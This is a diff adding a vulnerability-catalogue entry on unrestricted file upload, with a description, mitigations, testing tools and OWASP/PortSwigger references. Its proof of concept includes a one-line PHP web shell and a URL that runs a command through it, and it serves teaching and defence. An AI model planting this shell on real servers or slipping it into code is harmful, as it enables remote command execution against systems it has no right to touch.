@@ -8095,4 +8095,57 @@ If `victim.com` misconfigures CORS, attacker can exfiltrate data cross-origin.
 - https://portswigger.net/web-security/cors
 - https://github.com/chenjj/CORScanner
 ---
+# WEBVULN-081: Unrestricted File Upload
+
+## Category  
+File Handling / Server-Side Vulnerability
+
+## Vulnerability  
+**Unrestricted File Upload**
+
+## Description  
+Unrestricted file upload allows attackers to upload files without proper validation. This can lead to:
+- Remote Code Execution (RCE)
+- Cross-Site Scripting (XSS)
+- Denial of Service (DoS)
+- Phishing via malicious HTML pages
+
+Attackers typically upload scripts like `.php`, `.jsp`, or `.exe` that execute on the server.
+
+## Demo / Proof of Concept
+
+### Scenario:
+Upload endpoint accepts arbitrary files without filtering extensions or MIME types.
+
+### Exploit:
+Upload a PHP shell:
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Then access:
+```
+https://target.com/uploads/shell.php?cmd=whoami
+```
+
+## Mitigation
+
+- Restrict file types by validating extensions and MIME types.
+- Rename uploaded files to randomized names.
+- Store uploads outside the web root.
+- Use file content scanning libraries or AVs.
+- Set appropriate permissions on upload directories.
+- Use static file servers (e.g., S3) with no execution permissions.
+
+## Testing Tools / Techniques
+
+- Burp Suite Repeater
+- Upload a `.php`, `.asp`, `.jsp`, `.svg` payload
+- `curl -F` or Postman for multipart/form-data testing
+
+## References
+
+- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+- https://portswigger.net/web-security/file-upload
+---
 
